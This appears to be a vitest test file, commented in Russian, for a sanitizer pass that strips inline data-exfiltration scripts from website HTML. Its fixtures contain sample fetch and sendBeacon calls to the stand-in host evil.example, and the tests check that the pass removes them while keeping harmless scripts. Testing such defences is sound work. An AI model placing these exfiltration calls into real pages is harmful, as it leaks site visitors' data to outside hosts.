import { describe, it, expect } from 'vitest';
import { parseHtml, serializeHtml } from '../../../utils/html-dom.js';
import type { PassContext } from '../../../types.js';
import { removeInlineExfilPass } from '../remove-inline-exfil-pass.js';

const ctx = (): PassContext => ({
  siteDir: '/s', mainHost: 'mysite.com', filePath: '/s/index.html', relPath: 'index.html', log: [], quarantine: [],
});

function run(html: string, c = ctx()): string {
  const $ = parseHtml(html);
  removeInlineExfilPass($, c);
  return serializeHtml($);
}

describe('removeInlineExfilPass (DOM)', () => {
  it('вырезает fetch на внешний хост, сохраняя остальной JS как сырой текст', () => {
    const html = `<!DOCTYPE html><html><head><script>
var x = 1 < 2 && 3 > 2;
fetch('https://evil.example/steal');
function quiz(){ return x; }
</script></head><body></body></html>`;
    const out = run(html);
    expect(out).not.toContain('evil.example');
    // оператор сравнения НЕ должен экранироваться в &lt;/&gt;
    expect(out).toContain('1 < 2 && 3 > 2');
    expect(out).toContain('function quiz()');
  });

  it('простой инлайн-скрипт (скролл/квиз) остаётся нетронутым', () => {
    const c = ctx();
    const html = `<html><head><script>
document.querySelector('#btn').addEventListener('click', function(){ window.scrollTo(0, 0); });
</script></head><body></body></html>`;
    const out = run(html, c);
    expect(out).toContain('scrollTo(0, 0)');
    expect(out).toContain('addEventListener');
  });

  it('блок, состоящий только из exfil, удаляется целиком', () => {
    const html = `<html><head><script>navigator.sendBeacon('https://evil.example/b', 'x');</script></head><body></body></html>`;
    const out = run(html);
    expect(out).not.toContain('evil.example');
    expect(out).not.toContain('sendBeacon');
  });
});
